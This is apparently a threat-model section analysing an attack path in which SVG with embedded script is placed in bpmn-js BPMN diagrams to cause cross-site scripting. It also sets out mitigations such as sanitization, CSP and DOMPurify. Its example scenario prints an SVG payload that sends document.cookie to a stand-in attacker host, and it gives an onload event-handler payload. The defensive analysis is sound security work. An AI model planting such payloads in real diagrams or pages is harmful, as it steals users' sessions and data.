### 4. Deep Analysis of Attack Tree Path: Embed SVG with Malicious Script

**Attack Tree Path Breakdown:**

* **Step 1: Embedding Scalable Vector Graphics (SVG) within BPMN diagrams:**  Attackers can leverage the ability to include SVG elements within BPMN diagrams. This can occur through various means:
    * **Directly crafting malicious BPMN XML:** An attacker might directly manipulate the BPMN XML to include custom shapes or elements that contain malicious SVG code.
    * **Exploiting input mechanisms:** If the application allows users to upload or define custom shapes or elements, an attacker could inject malicious SVG during this process.
    * **Compromising data sources:** If BPMN diagrams are loaded from an external source, compromising that source could allow the injection of malicious SVG.

* **Step 2: Crafting the SVG to include `<script>` tags or event handlers (like `onload`) that execute malicious JavaScript when the SVG is rendered:**  SVG supports embedding JavaScript code within `<script>` tags or through event handlers like `onload`, `onclick`, etc. Attackers can exploit this to execute arbitrary JavaScript code within the user's browser when the SVG is rendered.

* **Step 3: Example: Using a custom BPMN shape that renders an SVG containing `<svg><script>...</script></svg>`:** This is a concrete example of how the attack can be implemented. When `bpmn-js` renders this custom shape, the browser will parse the SVG and execute the JavaScript within the `<script>` tag.

**Technical Deep Dive:**

* **`bpmn-js` Rendering Process:** `bpmn-js` utilizes the browser's native SVG rendering capabilities. When it encounters an SVG element within a BPMN diagram (especially within custom shapes or elements), it passes this SVG to the browser for rendering.
* **Browser SVG Interpretation:** Web browsers are designed to interpret and render SVG content, including the execution of JavaScript embedded within it. This is a standard feature of SVG.
* **Cross-Site Scripting (XSS) Potential:** This attack path is a classic example of a client-side Cross-Site Scripting (XSS) vulnerability. The malicious script originates from the context of the rendered BPMN diagram, which the browser interprets as coming from the application's domain.
* **Attack Vectors:**
    * **`<script>` tag:** The most straightforward method is to include a `<script>` tag containing the malicious JavaScript code directly within the SVG.
    * **Event Handlers:** Event handlers like `onload` can be used to execute JavaScript when the SVG is loaded. For example: `<svg onload="alert('Malicious!')"></svg>`. Other event handlers like `onclick`, `onmouseover`, etc., could also be used if the SVG elements are interactive.
    * **`javascript:` URLs:**  While less common in direct SVG embedding within `bpmn-js`, it's worth noting that `javascript:` URLs can also be used in certain SVG attributes to execute scripts.

**Potential Impact:**

A successful execution of malicious JavaScript through embedded SVG can have significant consequences:

* **Data Theft:** The script can access cookies, local storage, and session storage, potentially stealing sensitive user data or session tokens.
* **Session Hijacking:** Stolen session tokens can be used to impersonate the user and gain unauthorized access to the application.
* **UI Manipulation:** The script can manipulate the DOM (Document Object Model) of the application, altering the user interface, displaying fake content, or redirecting the user to malicious websites.
* **Keylogging:** The script can register event listeners to capture user keystrokes, potentially stealing credentials or other sensitive information.
* **Malware Distribution:** The script can redirect the user to websites hosting malware or initiate downloads of malicious software.
* **Denial of Service (DoS):** The script could perform actions that overload the client's browser, leading to a denial of service.

**Likelihood:**

The likelihood of this attack depends on several factors:

* **Application's handling of user-provided BPMN diagrams:** If the application allows users to upload or define custom shapes without proper sanitization, the likelihood is high.
* **Security awareness of developers:** If developers are not aware of the risks associated with embedding untrusted SVG content, they might not implement necessary security measures.
* **Complexity of the application:** More complex applications with more features for customization might present more opportunities for injection.

**Mitigation Strategies:**

To mitigate the risk of this attack, the following strategies should be implemented:

* **Input Sanitization:**  Thoroughly sanitize any user-provided BPMN diagrams or custom shape definitions before rendering them. This includes:
    * **Removing `<script>` tags:**  Strip out any `<script>` tags found within SVG content.
    * **Removing event handlers:**  Remove potentially dangerous event handlers like `onload`, `onclick`, `onmouseover`, etc., from SVG elements.
    * **Using a secure SVG parser:** Employ a robust SVG parser that can identify and neutralize potentially malicious code.
    * **Content Security Policy (CSP):** Implement a strong Content Security Policy (CSP) that restricts the sources from which scripts can be loaded and executed. This can help prevent the execution of injected malicious scripts. Specifically, consider directives like `script-src 'self'` or a strict nonce-based CSP.
* **Secure Defaults:**  Avoid allowing arbitrary SVG embedding by default. If custom shapes are necessary, provide a limited and controlled set of pre-defined shapes or use a secure templating mechanism.
* **Sandboxing:** If possible, render SVG content within a sandboxed environment (e.g., an iframe with restricted permissions) to limit the potential impact of malicious scripts.
* **Regular Security Audits:** Conduct regular security audits and penetration testing to identify potential vulnerabilities in the application's handling of SVG content.
* **Educate Developers:** Ensure that developers are aware of the risks associated with embedding untrusted SVG content and are trained on secure coding practices.
* **Consider using a dedicated SVG sanitization library:** Libraries like DOMPurify can be used to sanitize SVG content effectively.
* **Contextual Encoding:** If SVG content needs to be dynamically generated, ensure proper contextual encoding to prevent the interpretation of malicious code.

**Specific Considerations for `bpmn-js`:**

* **Custom Element Handling:** Pay close attention to how the application handles custom BPMN elements and their associated rendering logic. Ensure that any mechanisms for defining or rendering custom shapes are secure.
* **Plugin Security:** If using `bpmn-js` plugins that handle SVG rendering or manipulation, review their code for potential vulnerabilities.
* **Diagram Loading Process:** Secure the process of loading BPMN diagrams, especially if they originate from external or untrusted sources.

**Example Scenario:**

Imagine a platform where users can create and share BPMN diagrams. An attacker could create a diagram with a custom shape representing a "malicious node." The definition of this shape includes an SVG with the following code:

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="red" />
  <script>
    // Malicious script to steal cookies and send them to an attacker's server
    fetch('https://attacker.example.com/steal?cookie=' + document.cookie);
  </script>
</svg>
```

When another user opens this diagram in the application, `bpmn-js` will render the custom shape, and the browser will execute the JavaScript within the `<script>` tag, potentially compromising the user's session.

**Conclusion:**

The "Embed SVG with malicious script" attack path poses a significant risk to applications using `bpmn-js`. By understanding the mechanics of this attack and implementing robust mitigation strategies, development teams can significantly reduce the likelihood and impact of such vulnerabilities. Prioritizing input sanitization, implementing a strong CSP, and educating developers are crucial steps in securing the application against this type of threat.
